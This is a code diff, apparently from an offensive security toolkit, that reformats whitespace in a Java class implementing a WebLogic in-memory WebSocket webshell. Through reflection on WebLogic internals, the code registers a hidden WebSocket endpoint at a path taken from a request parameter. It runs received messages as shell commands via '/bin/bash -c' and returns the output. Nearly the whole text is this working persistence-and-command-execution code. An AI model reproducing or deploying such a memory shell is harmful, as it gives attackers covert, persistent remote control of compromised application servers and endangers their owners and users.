@@ -27,17 +27,17 @@ public class WsWeblogic extends Endpoint implements MessageHandler.Whole<String>
     static {
         try {
             Thread threadLocal = Thread.currentThread();
-            Field  workEntry   = threadLocal.getClass().getDeclaredField("workEntry");
+            Field workEntry = threadLocal.getClass().getDeclaredField("workEntry");
             workEntry.setAccessible(true);
             weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor wlsRequestExecutor = (ContainerSupportProviderImpl.WlsRequestExecutor) workEntry.get(threadLocal);
-            Field                                                                     field1             = wlsRequestExecutor.getClass().getDeclaredField("connectionHandler");
+            Field field1 = wlsRequestExecutor.getClass().getDeclaredField("connectionHandler");
             field1.setAccessible(true);
             weblogic.servlet.internal.HttpConnectionHandler connectionHandler = (HttpConnectionHandler) field1.get(wlsRequestExecutor);
-            ServletRequestImpl                              request           = connectionHandler.getServletRequest();
-            String                                          path              = request.getParameter("path");
-            ServerEndpointConfig                            configEndpoint    = ServerEndpointConfig.Builder.create(WsWeblogic.class, path).build();
-            MBeanServer                                     server            = ManagementFactory.getPlatformMBeanServer();
-            Field                                           field             = server.getClass().getDeclaredField("wrappedMBeanServer");
+            ServletRequestImpl request = connectionHandler.getServletRequest();
+            String path = request.getParameter("path");
+            ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(WsWeblogic.class, path).build();
+            MBeanServer server = ManagementFactory.getPlatformMBeanServer();
+            Field field = server.getClass().getDeclaredField("wrappedMBeanServer");
             field.setAccessible(true);
             Object obj = field.get(server);
             field = obj.getClass().getDeclaredField("mbsInterceptor");
@@ -45,7 +45,7 @@ public class WsWeblogic extends Endpoint implements MessageHandler.Whole<String>
             obj = field.get(obj);
             field = obj.getClass().getDeclaredField("repository");
             field.setAccessible(true);
-            Repository       repository   = (Repository) field.get(obj);
+            Repository repository = (Repository) field.get(obj);
             Set<NamedObject> namedObjects = repository.query(new ObjectName("com.bea:Type=ApplicationRuntime,*"), null);
             for (NamedObject namedObject : namedObjects) {
                 field = namedObject.getObject().getClass().getDeclaredField("managedResource");
@@ -59,7 +59,7 @@ public class WsWeblogic extends Endpoint implements MessageHandler.Whole<String>
                         field = o.getClass().getDeclaredField("context");
                         field.setAccessible(true);
                         WebAppServletContext servletContext = (WebAppServletContext) field.get(o);
-                        TyrusServerContainer container      = (TyrusServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
+                        TyrusServerContainer container = (TyrusServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
                         try {
                             container.register((jakarta.websocket.server.ServerEndpointConfig) configEndpoint);
                             System.out.println("add success,path: " + servletContext.getContextPath() + path);
@@ -86,9 +86,9 @@ public class WsWeblogic extends Endpoint implements MessageHandler.Whole<String>
             } else {
                 process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", s});
             }
-            InputStream   inputStream   = process.getInputStream();
+            InputStream inputStream = process.getInputStream();
             StringBuilder stringBuilder = new StringBuilder();
-            int           i;
+            int i;
             while ((i = inputStream.read()) != -1)
                 stringBuilder.append((char) i);
             inputStream.close();
